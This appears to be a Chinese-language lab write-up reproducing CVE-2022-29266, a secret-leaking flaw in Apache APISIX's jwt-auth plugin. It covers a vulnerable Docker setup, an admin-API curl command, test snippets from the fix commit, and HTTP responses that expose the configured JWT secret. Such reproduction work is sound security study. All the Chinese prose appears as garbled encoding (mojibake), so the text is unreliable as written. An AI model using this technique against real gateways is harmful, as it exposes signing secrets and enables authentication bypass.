# CVE-2022-29266 ï¼ˆApache APISIX ä¿¡æ¯æ³„éœ²æ¼æ´ï¼‰ ğŸ‘‹

## æ¦‚è¿°

åœ¨2.13.1ç‰ˆæœ¬ä¹‹å‰çš„APache APISIXä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘å—jwt-authæ’ä»¶ä¿æŠ¤çš„è·¯ç”±å‘é€é”™è¯¯çš„JSON Web Tokenï¼Œé€šè¿‡é”™è¯¯ä¿¡æ¯å“åº”è·å¾—æ’ä»¶é…ç½®çš„æ•æ„Ÿä¿¡æ¯ã€‚ä¾èµ–åº“lua-resty-jwtä¸­çš„é”™è¯¯é€»è¾‘å…è®¸å‘éœ€è¦HS256 Tokençš„ç«¯ç‚¹å‘é€RS256 Tokenï¼Œå¹¶åœ¨é”™è¯¯å“åº”ä¸­åŒ…å«åŸå§‹å¯†é’¥å€¼ã€‚

å…³é”®ç‚¹ï¼š

- å¯ç”¨jwt-authæ’ä»¶
- é”™è¯¯çš„tokenä¿¡æ¯é€ æˆæŠ¥é”™æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯
- éœ€è¦å‘é€é”™è¯¯çš„RS256æ ¼å¼çš„token

1. 

## å¤ç°åˆ†æ

ä»apisix-dockeræ‹‰å–é•œåƒ
```https://github.com/apache/apisix-docker```

è¿›å…¥åˆ°xxx/apisix-docker/exampleç›®å½•

ä¿®æ”¹docker-compose.yml apisixéƒ¨åˆ†çš„ç‰ˆæœ¬ä½äº2.13.1 ï¼Œæ­¤å¤„ä¿®æ”¹ä¸º2.10.5-alpine

```
apisix:
    image: apache/apisix:2.10.5-alpine
    restart: always
    volumes:
      - ./apisix_log:/usr/local/apisix/logs
      - ./apisix_conf/config.yaml:/usr/local/apisix/conf/config.yaml:ro
    depends_on:
      - etcd
    ##network_mode: host
    ports:
      - "9080:9080/tcp"
      - "9091:9091/tcp"
      - "9443:9443/tcp"
      - "9092:9092/tcp"
    networks:
      apisix:
```

å‘½ä»¤sudo docker-compose up -då¯åŠ¨é•œåƒ

æ³¨æ„åˆ°ç”±äºè¦å¯ç”¨jwt-authæ’ä»¶ï¼Œç”±äºæ²¡æœ‰ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥ç‚¹è¿›é…ç½®çš„æ—¶å€™æœ‰ç‚¹æ‡µï¼Œç›´æ¥çœ‹å®˜æ–¹æ“ä½œæ–‡æ¡£ï¼ˆhttps://apisix.apache.org/zh/docs/apisix/plugins/jwt-auth/ï¼‰

å®˜æ–¹æ‰‹å†Œä¸­è¯´æ˜ï¼šâ€œ`jwt-auth` æ˜¯ä¸€ä¸ªè®¤è¯æ’ä»¶ï¼Œå®ƒéœ€è¦ä¸ `consumer` ä¸€èµ·é…åˆæ‰èƒ½å·¥ä½œã€‚â€ é‚£å°±éœ€è¦é…ç½®consumerï¼Œç»§ç»­æŸ¥çœ‹æ‰‹å†Œå‘ç°ä»¥ä¸‹é…ç½®ä»£ç ï¼Œç›´æ¥ä½¿ç”¨curlåœ¨9080ç«¯å£ä¸Šåˆ›å»ºä¸€ä¸ªconsumerï¼Œå¹¶é…ç½®äº†jwt-authçš„keyå’Œsecretã€‚

```
curl http://127.0.0.1:9080/apisix/admin/consumers -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
{
    "username": "jack",
    "plugins": {
        "jwt-auth": {
            "key": "user-key",
            "secret": "my-secret-key"
        }
    }
}'
```

æŸ¥çœ‹å®˜æ–¹ä¿®æ”¹çš„commitå‘ç°ï¼ˆä»¥ä¸‹ä»£ç ä¸ºå®˜æ–¹commitä¿®å¤ä»£ç ï¼‰

1ã€å½“ä½¿ç”¨GETè¯·æ±‚å¸¦ä¸Šjwtå‚æ•°çš„æ—¶å€™å¦‚æœå‡ºé”™ä¼šè§¦å‘jwt-authçš„é”™è¯¯ä¿¡æ¯

2ã€å½“åœ¨headerså¤´ä¸­å¡«å†™é”™è¯¯çš„Authorizationå¤´çš„æ—¶å€™ä¹Ÿä¼šè§¦å‘jwt-authçš„é”™è¯¯ä¿¡æ¯

```
GET /hello?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTU2Mzg3MDUwMX0.pPNVvh-TQsdDzorRwa-uuiLYiEBODscp9wv0cwD6c68
--- error_code: 401
--- response_body
{"message":"'exp' claim expired at Tue, 23 Jul 2019 08:28:21 GMT"}
{"message":"JWT token verify failed"}
--- error_log
JWT token verify failed: 'exp' claim expired at Tue, 23 Jul 2019 08:28:21 GMT



@@ -274,7 +278,9 @@ GET /hello
Authorization: bearer invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTg3OTMxODU0MX0.fNtFJnNmJgzbiYmGB0Yjvm-l6A6M4jRV1l4mnVFSYjs
--- error_code: 401
--- response_body
{"message":"invalid header: invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}
{"message":"JWT token invalid"}
--- error_log
JWT token invalid: invalid header: invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

åˆ°è¿™å·²ç»èƒ½ç›´æ¥å¤ç°äº†ï¼Œä¸¤ç§æ–¹å¼å¯ä»¥é€‰æ‹©ä¸€ç§å³å¯éªŒè¯ã€‚

å›é¡¾æœ€å¼€å§‹æåˆ°çš„æ³¨æ„ä¸­â€œéœ€è¦å‘é€é”™è¯¯çš„RS256æ ¼å¼çš„tokenâ€é—®é¢˜ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥æä¾›éšä¾¿å­—ç¬¦ï¼Ÿè€Œæ˜¯éœ€è¦æä¾›ä¸€ä¸ªé”™è¯¯çš„RS256æ ¼å¼çš„tokenï¼Œå®˜æ–¹å…¶å®ä¿®æ”¹äº†ä¸¤ä¸ªåœ°æ–¹ï¼š

1ã€ä¿®å¤äº†è§¦å‘æŠ›å‡ºjwt-authé”™è¯¯ä¿¡æ¯çš„é€»è¾‘

2ã€ä¿®å¤äº†jwt_obj.validå’Œjwt_obj.verifiedæŠ›å‡ºé”™è¯¯ä¿¡æ¯çš„å¼‚å¸¸

é€šè¿‡çœ‹ç¬¬2ç‚¹çš„åå­—ä¹Ÿåº”è¯¥èƒ½çŸ¥é“ï¼Œvalidæ˜¯åˆ¤æ–­tokenæ ¼å¼æ˜¯å¦åˆæ³•ï¼Œverifiedæ‰æ˜¯éªŒè¯ï¼Œç„¶è€Œä¸¤è€…ä¸­åªæœ‰verifiedæ—¶å‡ºé”™äº†æ‰ä¼šè¿”å›keyï¼Œè€Œè§¦å‘validä¸ä¼šè§¦å‘ï¼Œä»¥ä¸‹æ˜¯ä¸¤ç§ä¸åŒæƒ…å†µè§¦å‘çš„è¿”å›åŒ…ï¼š

1ã€jwtåˆæ³•ä½†æ˜¯æœ‰é”™è¯¯

```
HTTP/1.1 401 Unauthorized
Date: Fri, 22 Apr 2022 15:41:03 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.5
Content-Length: 75

{"message":"Decode secret is not a valid cert\/public key: my-secret-key"}

```

2ã€jwtæ ¼å¼ä¸åˆæ³•

```
HTTP/1.1 401 Unauthorized
Date: Fri, 22 Apr 2022 15:40:47 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.5
Content-Length: 33

{"message":"invalid jwt string"}
```

## å›é¡¾

æ¼æ´æœ¬èº«ä¸å¤æ‚

å¤ç°çš„æ—¶å€™å¤šçœ‹å®˜ç½‘æ–‡æ¡£ï¼Œä¸€å¼€å§‹æ²¡çœ‹åˆ°consumeræ·»åŠ å®åœ¨9080ç«¯å£ï¼Œä¸€ç›´åœ¨9000ä¸Šæäº†åŠå¤©.....

## å‚è€ƒ

https://www.openwall.com/lists/oss-security/2022/04/20/1

https://github.com/apache/apisix/pull/6846/files#diff-9b9604832706062cf84d2e9b7a13754c0f21a9a0b34cf271a4eb059f4bffbdaaL436